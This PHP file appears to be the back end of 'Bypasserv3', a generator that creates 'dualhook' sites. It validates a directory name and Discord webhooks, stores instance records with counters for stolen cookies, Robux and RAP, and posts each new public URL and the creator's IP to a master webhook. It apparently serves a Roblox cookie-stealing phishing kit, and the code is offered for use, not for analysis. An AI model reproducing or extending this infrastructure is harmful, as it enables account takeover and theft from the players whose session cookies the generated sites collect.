<?php
/**
 * Bypasserv3 - Dualhook Instance Creator
 * Updated for simplified single webhook
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

require_once '../config.php';
require_once '../functions.php';

// ============================================
// METHOD CHECK
// ============================================
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

// ============================================
// PARSE INPUT
// ============================================
$input = json_decode(file_get_contents('php://input'), true);

if (json_last_error() !== JSON_ERROR_NONE) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid JSON']);
    exit;
}

$directory = sanitizeDirectory($input['directory'] ?? '');
$masterWebhook = trim($input['masterWebhook'] ?? MASTER_WEBHOOK);
$userWebhook = trim($input['userWebhook'] ?? '');

// ============================================
// VALIDATION
// ============================================

// Directory validation
if (empty($directory) || strlen($directory) < 3) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Directory name must be at least 3 characters']);
    exit;
}

if (strlen($directory) > 32) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Directory name must be less than 32 characters']);
    exit;
}

if (!preg_match('/^[a-zA-Z0-9_-]+$/', $directory)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Directory can only contain letters, numbers, hyphens, and underscores']);
    exit;
}

if (directoryExists($directory)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Directory already exists. Please choose a different name.']);
    exit;
}

// Master Webhook validation
if (empty($masterWebhook)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Webhook URL is required']);
    exit;
}

if (!validateWebhook($masterWebhook)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid webhook URL. Please check your Discord webhook.']);
    exit;
}

// ============================================
// RATE LIMITING
// ============================================
$clientIP = getUserIP();
if (!checkRateLimit($clientIP, 10, 3600)) {
    http_response_code(429);
    echo json_encode(['success' => false, 'error' => 'Rate limit exceeded. Please try again later.']);
    exit;
}

// ============================================
// CREATE INSTANCE DATA
// ============================================
$instanceData = [
    'directory' => $directory,
    'masterWebhook' => $masterWebhook,
    'userWebhook' => $userWebhook ?: $masterWebhook,
    'createdAt' => date('c'),
    'createdIP' => $clientIP,
    'stats' => [
        'totalCookies' => 0,
        'totalRobux' => 0,
        'totalRAP' => 0,
        'totalVisits' => 0,
        'totalSummary' => 0
    ],
    'dailyStats' => [
        'cookies' => array_fill(0, 7, 0),
        'robux' => array_fill(0, 7, 0),
        'rap' => array_fill(0, 7, 0),
        'visits' => array_fill(0, 7, 0),
        'summary' => array_fill(0, 7, 0)
    ]
];

// Save instance data
saveInstanceData($directory, $instanceData);

// ============================================
// SEND WEBHOOK NOTIFICATION
// ============================================
$payload = [
    'embeds' => [[
        'title' => '✅ New Site Generated',
        'description' => "**Site Name:** `{$directory}`\n**Public URL:** `https://" . ($_SERVER['HTTP_HOST'] ?? 'localhost') . "/public/?r={$directory}`",
        'color' => 0x0a9cc9,
        'fields' => [
            ['name' => 'Webhook', 'value' => '✓ Connected', 'inline' => false],
            ['name' => 'Created', 'value' => date('Y-m-d H:i:s'), 'inline' => true],
            ['name' => 'IP', 'value' => $clientIP, 'inline' => true]
        ],
        'footer' => ['text' => 'Bypasserv3 Generator'],
        'timestamp' => date('c')
    ]]
];
sendWebhookNotification($masterWebhook, $payload);

// Update global stats
updateGlobalStats('totalInstances', 1);

// ============================================
// RETURN SUCCESS RESPONSE
// ============================================
echo json_encode([
    'success' => true,
    'directory' => $directory,
    'publicUrl' => 'https://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . '/public/?r=' . $directory,
    'message' => 'Site generated successfully!'
]);
?>
